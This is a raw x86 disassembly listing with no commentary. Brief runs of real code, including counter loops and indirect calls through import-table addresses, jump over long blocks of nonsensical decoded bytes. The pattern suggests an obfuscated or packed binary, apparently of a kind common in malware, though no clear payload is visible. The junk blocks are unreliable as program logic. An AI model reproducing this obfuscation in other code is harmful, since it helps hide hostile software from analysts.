  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	rcl    BYTE PTR [edx-0x76],1
  404a8e:	add    eax,DWORD PTR [edi+0x25]
  404a91:	jle    0x404b11
  404a93:	xchg   ecx,eax
  404a94:	jl     0x404b14
  404a96:	jle    0x404af5
  404a98:	jmp    0x404a67
  404a9a:	jno    0x404a82
  404a9c:	xor    DWORD PTR [ecx-0x28],esp
  404a9f:	cmp    BYTE PTR [edx-0x5847e279],dl
  404aa5:	ins    DWORD PTR es:[edi],dx
  404aa6:	xlat   BYTE PTR ds:[ebx]
  404aa7:	jae    0x404ade
  404aa9:	mov    ah,0x9f
  404aab:	adc    bh,BYTE PTR [edx+0x1032afec]
  404ab1:	daa    
  404ab2:	jo     0x404ad5
  404ab4:	ret    
  404ab5:	adc    ebx,DWORD PTR [esi]
  404ab7:	cdq    
  404ab8:	mov    dl,0x31
  404aba:	imul   edx,DWORD PTR [eax+0x56],0xffffffed
  404abe:	hlt    
  404abf:	lock jno 0x404a8a
  404ac2:	xor    eax,0x41f71360
  404ac7:	pop    ebp
  404ac8:	add    eax,0x40a13226
  404acd:	and    ch,ah
  404acf:	jae    0x404a9d
  404ad1:	dec    ecx
  404ad2:	sub    DWORD PTR [esi],0x304fb5fe
  404ad8:	jo     0x404afd
  404ada:	jne    0x404acd
  404adc:	jmp    0xd5848fb2
  404ae1:	sti    
  404ae2:	mov    esi,0x68d8974f
  404ae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ae8:	jae    0x404aa0
  404aea:	cmp    bh,BYTE PTR [esi+esi*4]
  404aed:	dec    eax
  404aee:	in     al,0x62
  404af0:	sbb    eax,0xa2487c3d
  404af5:	sbb    BYTE PTR ds:0xcc1ed97f,0xba
  404afc:	adc    DWORD PTR [edi+esi*2],0x7c
  404b00:	inc    edx
  404b01:	cmp    bh,BYTE PTR [ebp-0x56eb3367]
  404b07:	jge    0x404b6e
  404b09:	cmp    eax,0x88ee144c
  404b0e:	pop    eax
  404b0f:	xor    BYTE PTR [edi-0x148a0ec1],dh
  404b15:	mov    al,0xa3
  404b17:	mov    ds:0x666cd5b5,eax
  404b1c:	out    dx,eax
  404b1d:	fimul  WORD PTR [ebx+esi*1-0x51]
  404b21:	jns    0x404b1f
  404b23:	mov    esp,0xd5c89573
  404b28:	sbb    eax,0x9aa6458a
  404b2d:	mov    esp,0x57c25eed
  404b32:	or     bl,BYTE PTR [edx-0x34]
  404b35:	pushf  
  404b36:	push   ss
  404b37:	lds    eax,FWORD PTR [eax+0x64]
  404b3a:	cmp    al,0xad
  404b3c:	and    ebx,DWORD PTR [ecx-0xca34cda]
  404b42:	add    al,0x1a
  404b44:	dec    ebp
  404b45:	inc    ebp
  404b46:	stos   BYTE PTR es:[edi],al
  404b47:	mov    ah,0x7b
  404b49:	push   0x3c
  404b4b:	in     eax,0xbb
  404b4d:	pop    esi
  404b4e:	add    cl,ch
  404b50:	ror    ecx,1
  404b52:	es mov bl,0xcb
  404b55:	fwait
  404b56:	inc    ecx
  404b57:	add    eax,0x59afe8c9
  404b5c:	dec    eax
  404b5d:	xor    BYTE PTR [ecx+0x58],dl
  404b60:	and    dl,0xcd
  404b63:	call   0x956b:0x62c0eb1c
  404b6a:	sahf   
  404b6b:	scas   al,BYTE PTR es:[edi]
  404b6c:	js     0x404bb4
  404b6e:	(bad)  
  404b6f:	or     eax,edi
  404b71:	mov    ebp,edx
  404b73:	mov    dh,0xe6
  404b75:	xchg   edi,eax
  404b76:	mov    eax,0xf25d8527
  404b7b:	(bad)  
  404b7c:	and    edx,DWORD PTR [ebp+ebp*8-0x3e5bc88]
  404b83:	mov    BYTE PTR [esp+eax*1-0x180137a1],cl
  404b8a:	jecxz  0x404b74
  404b8c:	es dec ebp
  404b8e:	pop    ebp
  404b8f:	xor    ebp,DWORD PTR [eiz*2+0x6d3727be]
  404b96:	pop    esp
  404b97:	ins    BYTE PTR es:[edi],dx
  404b98:	test   al,0xb4
  404b9a:	add    BYTE PTR [esp+ecx*2],0x21
  404b9e:	rcr    BYTE PTR [ecx-0x4e],1
  404ba1:	lods   al,BYTE PTR ds:[esi]
  404ba2:	adc    dl,BYTE PTR [ebx+ebx*8]
  404ba5:	or     BYTE PTR [esi+0x70],bh
  404ba8:	(bad)  
  404ba9:	cwde   
  404baa:	in     al,0x60
  404bac:	(bad)  
  404bad:	push   ecx
  404bae:	ins    DWORD PTR es:[edi],dx
  404baf:	cmp    eax,0xb80fdfd8
  404bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bb5:	popf   
  404bb6:	push   ss
  404bb7:	(bad)  
  404bb8:	xchg   esp,eax
  404bb9:	mov    ds:0x775141f,al
  404bbe:	jmp    0xc0bf1154
  404bc3:	mov    BYTE PTR [ecx-0x3970d00f],cl
  404bc9:	mov    eax,DWORD PTR [edx+0x70fe610a]
  404bcf:	repz dec eax
  404bd1:	in     al,dx
  404bd2:	pop    ebp
  404bd3:	push   0x7951df1f
  404bd8:	push   ebx
  404bd9:	dec    esp
  404bda:	lahf   
  404bdb:	ss int3 
  404bdd:	outs   dx,DWORD PTR ds:[esi]
  404bde:	js     0x404bfa
  404be0:	xchg   esi,eax
  404be1:	sub    al,0xab
  404be3:	in     eax,0xc0
  404be5:	in     al,dx
  404be6:	adc    esp,ebp
  404be8:	sbb    eax,0x5f535208
  404bed:	inc    esi
  404bee:	cmp    DWORD PTR [eax-0x196d5622],edx
  404bf4:	mov    ah,BYTE PTR [ecx-0x57a45387]
  404bfa:	leave  
  404bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bfc:	cmp    eax,0xa0d3fa1c
  404c01:	(bad)  
  404c02:	int3   
  404c03:	xchg   DWORD PTR [ebp+0x2a],ebp
  404c06:	xor    bl,BYTE PTR [ecx-0x71]
  404c09:	and    DWORD PTR [esi+0x253564fc],edi
  404c0f:	sbb    al,0x5d
  404c11:	test   eax,0xd95f9f87
  404c16:	jl     0x404c78
  404c18:	mov    ebx,gs
  404c1a:	jge    0x404c15
  404c1c:	push   edi
  404c1d:	cmp    eax,edx
  404c1f:	lahf   
  404c20:	mov    bl,0x87
  404c22:	sbb    al,0x81
  404c24:	imul   DWORD PTR [edi]
  404c26:	mov    ch,0xd7
  404c28:	jae    0x404bef
  404c2a:	in     eax,0xb1
  404c2c:	jmp    0x4ddf4c52
  404c31:	mov    WORD PTR [esi-0x6e],ds
  404c34:	xor    eax,ebp
  404c36:	adc    eax,0x7422820a
  404c3b:	mov    ds:0xcbda159e,eax
  404c40:	ja     0x404c57
  404c42:	fiadd  DWORD PTR [ebx]
  404c44:	mov    al,0x3d
  404c46:	jg     0x404c16
  404c48:	push   esp
  404c49:	sar    BYTE PTR [edi],1
  404c4b:	int3   
  404c4c:	pop    esp
  404c4d:	popa   
  404c4e:	push   0xffffffe4
  404c50:	aam    0x75
  404c52:	fnstcw WORD PTR [edx-0x2efb520e]
  404c58:	cli    
  404c59:	fcmovnbe st,st(5)
  404c5b:	dec    eax
  404c5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c5d:	push   ebp
  404c5e:	mov    eax,0x4bb86504
  404c63:	ret    
  404c64:	mov    dh,0x94
  404c66:	aad    0x17
  404c68:	aam    0x76
  404c6a:	jge    0x404c50
  404c6c:	inc    esp
  404c6d:	daa    
  404c6e:	mov    al,0x62
  404c70:	or     al,0x7
  404c72:	ins    BYTE PTR es:[edi],dx
  404c73:	retf   0xfdab
  404c76:	push   ebp
  404c77:	pop    es
  404c78:	mov    edi,0xad259854
  404c7d:	shl    BYTE PTR [esi],cl
  404c7f:	or     eax,0xdf1ab978
  404c84:	xchg   BYTE PTR [edi],ah
  404c86:	push   cs
  404c87:	jecxz  0x404cae
  404c89:	ins    DWORD PTR es:[edi],dx
  404c8a:	aam    0x86
  404c8c:	mov    esi,0xce969eb1
  404c91:	sbb    ax,0x56a9
  404c95:	ficomp DWORD PTR [esi+0xed39b2b]
  404c9b:	sar    DWORD PTR [eax],cl
  404c9d:	sub    BYTE PTR [ecx-0x27174198],al
  404ca3:	ins    BYTE PTR es:[edi],dx
  404ca4:	pop    edx
  404ca5:	cmp    al,0x69
  404ca7:	cli    
  404ca8:	ins    BYTE PTR es:[edi],dx
  404ca9:	xchg   ecx,eax
  404caa:	pushf  
  404cab:	sub    eax,0xa6919e21
  404cb0:	clc    
  404cb1:	or     al,cl
  404cb3:	repnz shl BYTE PTR [esi],cl
  404cb6:	(bad)  
  404cb7:	jg     0x404c8a
  404cb9:	inc    ebp
  404cba:	or     DWORD PTR [ecx+0x46afe8c9],ecx
  404cc0:	dec    edi
  404cc1:	pop    esi
  404cc2:	inc    esi
  404cc3:	mov    ch,0x82
  404cc5:	les    esp,FWORD PTR [edi+0x49376319]
  404ccb:	cmp    ax,bx
  404cce:	xchg   esi,eax
  404ccf:	mov    edi,0x43b912a5
  404cd4:	pop    ds
  404cd5:	scas   al,BYTE PTR es:[edi]
  404cd6:	dec    ecx
  404cd7:	inc    eax
  404cd8:	push   ebx
  404cd9:	imul   eax,DWORD PTR [eax-0x786d2e2e],0x56
  404ce0:	xchg   ebp,eax
  404ce1:	sbb    dh,BYTE PTR [eax]
  404ce3:	mov    WORD PTR [ebx+0x54a642f6],ss
  404ce9:	pop    ds
  404cea:	in     al,dx
  404ceb:	pop    esi
  404cec:	jbe    0x404cc6
  404cee:	leave  
  404cef:	fs test eax,0x2751f3c2
  404cf5:	test   BYTE PTR [edi+eax*1-0x77286e7e],0x48
  404cfd:	loop   0x404d66
  404cff:	inc    ebx
  404d00:	pushf  
  404d01:	add    BYTE PTR [edx+0x4d],0x2b
  404d05:	add    BYTE PTR [ebx-0x4c],dl
  404d08:	sbb    dh,BYTE PTR [esi]
  404d0a:	mov    eax,0x7ae53146
  404d0f:	pop    ds
  404d10:	and    eax,ecx
  404d12:	mov    al,0xa2
  404d14:	jb     0x404d8d
  404d16:	mov    esp,0x72c0714e
  404d1b:	sbb    ebx,DWORD PTR gs:[ebp+0x43c51faf]
  404d22:	and    ebx,DWORD PTR [edi-0x111f113]
  404d28:	ja     0x404d6c
  404d2a:	cmp    esp,edi
  404d2c:	mov    al,0x53
  404d2e:	sub    dl,ch
  404d30:	xor    eax,0x246e443f
  404d35:	dec    ecx
  404d36:	div    ecx
  404d38:	mov    ecx,DWORD PTR [ebp+0x10]
  404d3b:	and    ecx,eax
  404d3d:	or     ecx,0x81161d8f
  404d43:	mov    eax,ecx
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0x3f185722
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404d2d
  404d6a:	(bad)  
  404d6c:	in     eax,0x88
  404d6e:	fcom   QWORD PTR [ebx-0x6]
  404d71:	jecxz  0x404cfb
  404d73:	repz jp 0x404d15
  404d76:	dec    edi
  404d77:	mov    eax,ds:0x30d51da0
  404d7c:	ficom  DWORD PTR [edi]
  404d7e:	(bad)  
  404d7f:	outs   dx,DWORD PTR ds:[esi]
  404d80:	push   edi
  404d81:	imul   eax,DWORD PTR [ecx+0x2a],0x295f7984
  404d88:	out    dx,eax
  404d89:	jge    0x404d48
  404d8b:	xchg   DWORD PTR [edx-0x5e],esi
  404d8e:	xor    DWORD PTR [edx],eax
  404d90:	fiadd  DWORD PTR [esi-0x7a]
  404d93:	jno    0x404dcf
  404d95:	xchg   ecx,eax
  404d96:	sub    dl,bl
  404d98:	cdq    
  404d99:	test   al,0x94
  404d9b:	in     eax,dx
  404d9c:	xchg   ebp,eax
  404d9d:	sub    al,0xfa
  404d9f:	ret    0xc3ae
  404da2:	push   esp
  404da3:	adc    eax,0x3ead7890
  404da8:	push   ebx
  404da9:	mov    ch,ch
  404dab:	(bad)  
  404dac:	addr16 mov edi,?
  404daf:	cmp    eax,0x44abf719
  404db4:	outs   dx,BYTE PTR ds:[esi]
  404db5:	ins    BYTE PTR es:[edi],dx
  404db6:	cli    
  404db7:	sti    
  404db8:	gs dec edx
  404dba:	ja     0x404e2e
  404dbc:	iret   
  404dbd:	xchg   DWORD PTR [ebx-0x1bf6e450],esp
  404dc3:	jnp    0x404df9
  404dc5:	fdiv   QWORD PTR [ebp-0x3e]
  404dc8:	xor    DWORD PTR [edx-0x63c32990],esi
  404dce:	loopne 0x404d6e
  404dd0:	lock push esi
  404dd2:	xor    BYTE PTR [esp+eiz*8-0x21],al
  404dd6:	popf   
  404dd7:	inc    esi
  404dd8:	push   edx
  404dd9:	addr16 cs mov cl,0xf3
  404ddd:	fdiv   DWORD PTR [ecx+0x7d]
  404de0:	ss icebp 
  404de2:	(bad)  
  404de3:	xlat   BYTE PTR ds:[ebx]
  404de4:	push   cs
  404de5:	xor    al,0xe2
  404de7:	adc    DWORD PTR [ecx+0x28ca6971],esi
  404ded:	scas   eax,DWORD PTR es:[edi]
  404dee:	pop    es
  404def:	mov    esp,0x32eed764
  404df4:	add    BYTE PTR [edx-0x3c],0x92
  404df8:	pop    ebp
  404df9:	shl    BYTE PTR [ecx-0x55],1
  404dfc:	shl    BYTE PTR [ecx-0x5f],1
  404dff:	push   ss
  404e00:	push   0xffffff8b
  404e02:	pop    esp
  404e03:	loop   0x404e62
  404e05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e06:	pop    ecx
  404e07:	add    BYTE PTR [esi-0x14],ch
  404e0a:	mov    dl,0xf3
  404e0c:	jb     0x404e0c
  404e0e:	jmp    0x587a:0xc8aef007
  404e15:	xor    BYTE PTR [eax],cl
  404e17:	rcr    DWORD PTR [esi+edx*2-0x14c621a6],0x22
  404e1f:	sub    ebp,DWORD PTR [esi]
  404e21:	and    DWORD PTR es:0xb6e51e3d,ebx
  404e28:	call   0xa7c63735
  404e2d:	(bad)  
  404e2e:	mov    WORD PTR [ebp-0x39],?
  404e31:	mov    eax,ds:0x5879f233
  404e36:	pop    esi
  404e37:	in     eax,0x25
  404e39:	xchg   BYTE PTR [esi-0x4090c1c3],dh
  404e3f:	scas   eax,DWORD PTR es:[edi]
  404e40:	xor    ah,dl
  404e42:	es cwde 
  404e44:	inc    esp
  404e45:	bound  esp,QWORD PTR [edi]
  404e47:	mov    ah,0xca
  404e49:	fucomip st,st(4)
  404e4b:	inc    edx
  404e4c:	clc    
  404e4d:	inc    edi
  404e4e:	cmp    eax,0x1e2461a
  404e53:	jne    0x404ebb
  404e55:	call   DWORD PTR [eax]
  404e57:	sbb    DWORD PTR [ecx],0x6e79bd97
  404e5d:	jbe    0x404e11
  404e5f:	xor    cl,bh
  404e61:	or     cl,BYTE PTR ds:0xff85f180
  404e67:	mov    dh,0x6b
  404e69:	jae    0x404e6f
  404e6b:	mov    ebp,0xec078c6c
  404e70:	test   BYTE PTR [ebx],0x7a
  404e73:	cmp    eax,0x3bd1f975
  404e78:	push   ds
  404e79:	jae    0x404ec6
  404e7b:	fisttp QWORD PTR [eax-0x25]
  404e7e:	das    
  404e7f:	lahf   
  404e80:	popf   
  404e81:	add    BYTE PTR [ecx-0x65],bh
  404e84:	inc    edi
  404e85:	das    
  404e86:	enter  0xd653,0x9f
  404e8a:	push   eax
  404e8b:	pusha  
  404e8c:	or     DWORD PTR [eax+eiz*2-0x1b],eax
  404e90:	dec    edx
  404e91:	xor    BYTE PTR [ecx],al
  404e93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e94:	add    esi,0xdeaa405e
  404e9a:	in     al,0x37
  404e9c:	into   
  404e9d:	arpl   WORD PTR [ebx+0x525c714d],cx
  404ea3:	fisub  DWORD PTR [ebx]
  404ea5:	enter  0xde9d,0x8c
  404ea9:	lods   al,BYTE PTR ds:[esi]
  404eaa:	dec    ebx
  404eab:	inc    ebx
  404eac:	jae    0x404f0e
  404eae:	jg     0x404eaf
  404eb0:	stc    
  404eb1:	xor    DWORD PTR [ebp-0x310ecaf5],edx
  404eb7:	jns    0x404e61
  404eb9:	(bad)  
  404ebb:	and    bh,BYTE PTR [edx-0x182a0f95]
  404ec1:	adc    al,0x74
  404ec3:	xor    BYTE PTR [edi-0x76],0xf7
  404ec7:	or     ch,BYTE PTR [edi+ecx*2]
  404eca:	rcl    BYTE PTR [ecx],1
  404ecc:	fisubr DWORD PTR [eax+0x57]
  404ecf:	call   0xa645:0x8a961010
  404ed6:	fisub  DWORD PTR [ebx]
  404ed8:	(bad)  
  404ed9:	fs lock cli 
  404edc:	imul   edi,ebp,0x4426925d
  404ee2:	test   eax,0xee7768b5
  404ee7:	push   ss
  404ee8:	push   ds
  404ee9:	or     ah,BYTE PTR [ebp+0x17cee35c]
  404eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ef0:	int3   
  404ef1:	pop    esp
  404ef2:	int3   
  404ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ef4:	push   ds
  404ef5:	clc    
  404ef6:	fwait
  404ef7:	push   ecx
  404ef8:	ins    BYTE PTR es:[edi],dx
  404ef9:	out    dx,al
  404efa:	dec    ebp
  404efb:	adc    DWORD PTR ds:0x8ff6a1bf,ecx
  404f01:	dec    ebx
  404f02:	int    0x98
  404f04:	mov    bl,0xb4
  404f06:	je     0x404f38
  404f08:	out    0xcf,eax
  404f0a:	jle    0x404f5f
  404f0c:	mov    ecx,0xd6853306
  404f11:	test   BYTE PTR [eax],dl
  404f13:	pop    esi
  404f14:	xlat   BYTE PTR ds:[ebx]
  404f15:	xchg   ebp,eax
  404f16:	fucom  st(1)
  404f18:	clc    
  404f19:	xchg   esi,eax
  404f1a:	jge    0x404f9b
  404f1c:	(bad)  
  404f1d:	std    
  404f1e:	and    ch,BYTE PTR [edi-0x487ce63d]
  404f24:	pusha  
  404f25:	shr    al,cl
  404f27:	or     esp,DWORD PTR [edx-0x77]
  404f2a:	pop    ebp
  404f2b:	cmp    dl,ah
  404f2d:	sbb    ebx,ecx
  404f2f:	cmp    DWORD PTR [edx+0x7162fcc5],ecx
  404f35:	lods   eax,DWORD PTR ds:[esi]
  404f36:	jmp    DWORD PTR [edi]
  404f38:	imul   edx,DWORD PTR [eax+ecx*8+0x4a6645c7],0x6c
  404f40:	pop    ebp
  404f41:	mov    DWORD PTR [edx+0x32],ebx
  404f44:	inc    ecx
  404f45:	pop    ecx
  404f46:	test   eax,0x1a4c8689
  404f4b:	fs iret 
  404f4d:	int    0x20
  404f4f:	dec    eax
  404f50:	add    bh,BYTE PTR [edx+0x2a008728]
  404f56:	outs   dx,DWORD PTR ds:[esi]
  404f57:	(bad)  
  404f58:	pop    esp
  404f59:	push   ecx
  404f5a:	and    DWORD PTR ds:0x430459,0x0
  404f64:	jmp    0x404f74
  404f69:	mov    eax,ds:0x430459
  404f6e:	inc    eax
  404f6f:	mov    ds:0x430459,eax
  404f74:	cmp    DWORD PTR ds:0x430459,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x430459,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e7d4
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42ea9f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42edd7
  404faf:	xor    edx,DWORD PTR ds:0x430451
  404fb5:	mov    DWORD PTR ds:0x42edd7,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ee69
  404fc8:	mov    eax,ds:0x42e983
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e7d8
  404fdc:	sub    ecx,DWORD PTR ds:0x43044d
  404fe2:	mov    DWORD PTR ds:0x42e7d8,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42edf3,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42edf3
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42edf3,ecx
  405002:	cmp    DWORD PTR ds:0x42edf3,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e9d3
  405018:	cmp    DWORD PTR ds:0x42edf3,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42edf3
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42edf3,ecx
  405034:	cmp    DWORD PTR ds:0x42edf3,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	adc    BYTE PTR [eax+0x2ed6ee90],al
  405058:	jle    0x4050d8
  40505a:	outs   dx,BYTE PTR ds:[esi]
  40505b:	jg     0x4050db
  40505d:	jle    0x404fe5
  40505f:	push   ecx
  405060:	cmp    al,0x40
  405062:	mov    bl,0x20
  405064:	cmp    DWORD PTR [edx+0x48],esp
  405067:	inc    edi
  405068:	xchg   ebp,eax
  405069:	pop    ebx
  40506a:	outs   dx,DWORD PTR ds:[esi]
  40506b:	or     DWORD PTR [esi],eax
  40506d:	cld    
  40506e:	icebp  
  40506f:	xor    al,0x27
  405071:	cmp    al,0xfb
  405073:	daa    
  405074:	aas    
  405075:	sbb    ecx,DWORD PTR [esi+ecx*1-0x2f]
  405079:	aad    0xca
  40507b:	not    BYTE PTR [edi+0x63]
  40507e:	retf   0xb6fb
  405081:	sbb    al,0xb2
  405083:	pop    esp
  405084:	xchg   ecx,eax
  405085:	jo     0x4050f7
  405087:	sbb    ch,BYTE PTR ds:0x5d2dd60d
  40508d:	cmp    DWORD PTR [edx+0x60be49d5],0x9
  405094:	xor    eax,0xc451f484
  405099:	jg     0x4050f0
  40509b:	push   0x4b
  40509d:	push   0xea501427
  4050a2:	sub    BYTE PTR [ecx+0x51],0x34
  4050a6:	js     0x405084
  4050a8:	test   eax,0x8452ded5
  4050ad:	mov    al,ds:0xb009cfdb
  4050b2:	add    al,0xcf
  4050b4:	xchg   edi,eax
  4050b5:	out    0x9f,al
  4050b7:	mov    bl,0xd4
  4050b9:	push   cs
  4050ba:	adc    BYTE PTR [ecx],al
  4050bc:	(bad)  
  4050be:	or     DWORD PTR [ecx-0x19],esp
  4050c1:	cli    
  4050c2:	jbe    0x4050c5
  4050c4:	fldenv [esi+0x6e]
  4050c7:	fidivr WORD PTR [edi]
  4050c9:	retf   0xcfc8
  4050cc:	xor    edi,ebx
  4050ce:	push   cs
  4050cf:	enter  0xde0b,0x9b
  4050d3:	rol    DWORD PTR [edx+esi*1+0x43],0xd6
  4050d8:	add    al,0xc8
  4050da:	mov    db7,ebp
  4050dd:	mov    bh,0xc2
  4050df:	mov    ecx,0xea716acb
  4050e4:	js     0x4050a8
  4050e6:	add    eax,0xa5120506
  4050eb:	js     0x4050a9
  4050ed:	int    0x60
  4050ef:	popa   
  4050f0:	dec    eax
  4050f1:	into   
  4050f2:	mov    eax,gs
  4050f4:	push   ecx
  4050f5:	pop    edi
  4050f6:	retf   
  4050f7:	pushf  
  4050f8:	mov    ?,WORD PTR [edi-0x7223683c]
  4050fe:	pop    edx
  4050ff:	fadd   st,st(0)
  405101:	push   cs
  405102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405103:	(bad)  
  405104:	mov    eax,0x9340a815
  405109:	jmp    0x405116
  40510b:	(bad)  
  40510c:	loopne 0x40518b
  40510e:	int3   
  40510f:	ins    BYTE PTR es:[edi],dx
  405110:	mov    esp,0xe8092b28
  405115:	adc    DWORD PTR [esi],esp
  405117:	mov    al,ds:0xc6f59659
  40511c:	pop    ecx
  40511d:	inc    DWORD PTR [edx+edi*1+0xa]
  405121:	dec    ecx
  405122:	data16 int 0xdd
  405125:	and    BYTE PTR [esi-0x70839d0c],dl
  40512b:	out    dx,al
  40512c:	enter  0x602a,0x51
  405130:	push   es
  405131:	inc    esi
  405132:	das    
  405133:	jne    0x4050dd
  405135:	xchg   esi,eax
  405136:	in     al,dx
  405137:	adc    BYTE PTR [edi],ah
  405139:	call   0x3da15977
  40513e:	fild   DWORD PTR [ecx]
  405140:	adc    dh,BYTE PTR [edx]
  405142:	loop   0x4050f5
  405144:	aad    0x97
  405146:	push   es
  405147:	mov    dh,BYTE PTR [eax-0x500575ba]
  40514d:	mov    ch,0x4b
  40514f:	mov    ?,WORD PTR [edi]
  405151:	data16 arpl WORD PTR [esi-0x25],bx
  405155:	mov    edi,0xa67947f9
  40515a:	xor    DWORD PTR [edx-0x69],esp
  40515d:	nop
  40515e:	adc    al,BYTE PTR [ebp+0x5a83413b]
  405164:	out    0x6b,al
  405166:	shl    DWORD PTR [esi],0xe
  405169:	out    0xb5,al
  40516b:	xchg   edi,eax
  40516c:	arpl   WORD PTR ds:0xb0dadc6e,dx
  405172:	and    al,0x59
  405174:	out    dx,al
  405175:	es inc ecx
  405177:	dec    ebp
  405178:	fisubr DWORD PTR [edx]
  40517a:	out    0x5a,al
  40517c:	ins    BYTE PTR es:[edi],dx
  40517d:	inc    edx
  40517e:	inc    ebp
  40517f:	sahf   
  405180:	ret    0x63e3
  405183:	test   BYTE PTR [ebx+eiz*8+0x3376aa30],bh
  40518a:	inc    edi
  40518b:	xor    al,0x63
  40518d:	push   edx
  40518e:	retf   
  40518f:	and    eax,DWORD PTR [ebx+edx*1+0x54]
  405193:	js     0x4051bd
  405195:	jmp    0x79b:0x56b0b0aa
  40519c:	inc    esp
  40519d:	(bad)  
  40519e:	das    
  40519f:	lods   eax,DWORD PTR ds:[esi]
  4051a0:	jp     0x405191
  4051a2:	nop
  4051a3:	fild   WORD PTR [eax-0x3a775ecf]
  4051a9:	shl    BYTE PTR [ecx],0xfb
  4051ac:	dec    edx
  4051ad:	test   edx,eax
  4051af:	adc    eax,0x607aee14
  4051b4:	mov    al,ds:0xc0bcef95
  4051b9:	mov    ecx,0x3b3a4f10
  4051be:	call   0x26413eb8
  4051c3:	mov    ds:0x80c78e4,al
  4051c8:	and    al,0x90
  4051ca:	xchg   ebp,eax
  4051cb:	add    esp,DWORD PTR [ebp+0x51]
  4051ce:	push   0x2113c198
  4051d3:	sub    eax,0xddf65030
  4051d8:	cmc    
  4051d9:	ss xchg esp,eax
  4051db:	add    eax,0x4dd3da45
  4051e0:	and    DWORD PTR [esi+0x4e],0xdd4506fa
  4051e7:	lods   al,BYTE PTR ds:[esi]
  4051e8:	mov    edi,cs
  4051ea:	inc    ebx
  4051eb:	jl     0x4051f7
  4051ed:	sub    ebx,DWORD PTR [esi]
  4051ef:	cmp    al,0x2
  4051f1:	call   DWORD PTR [ebx-0x4c]
  4051f4:	arpl   WORD PTR [edx-0x59],di
  4051f7:	pop    es
  4051f8:	addr16 lahf 
  4051fa:	ret    0x446e
  4051fd:	sub    ebx,DWORD PTR [esi]
  4051ff:	xor    al,0x57
  405201:	mov    ecx,0xd401ca2
  405206:	fisubr WORD PTR [ebx]
  405208:	adc    edi,DWORD PTR [ecx-0x6]
  40520b:	sub    eax,0x38d70630
  405210:	mov    WORD PTR [edi],?
  405212:	xchg   ah,bh
  405214:	or     al,0xae
  405216:	mov    al,ds:0x7d4dabb1
  40521b:	je     0x405217
  40521d:	ret    0xb3df
  405220:	or     BYTE PTR [ebp+0x7ec0a409],cl
  405226:	dec    edx
  405227:	loope  0x40520c
  405229:	or     dl,BYTE PTR [ecx]
  40522b:	std    
  40522c:	jb     0x405225
  40522e:	jmp    0xa8b308ab
  405233:	mov    ebp,0xb76686e0
  405238:	sub    BYTE PTR [ebx],dh
  40523a:	dec    ebp
  40523b:	sti    
  40523c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40523d:	add    eax,0x2d6c7a0f
  405242:	dec    esp
  405243:	adc    ebx,eax
  405245:	push   esp
  405246:	jmp    0xc450e918
  40524b:	jnp    0x4051d3
  40524d:	or     eax,0x510854b9
  405252:	pop    es
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
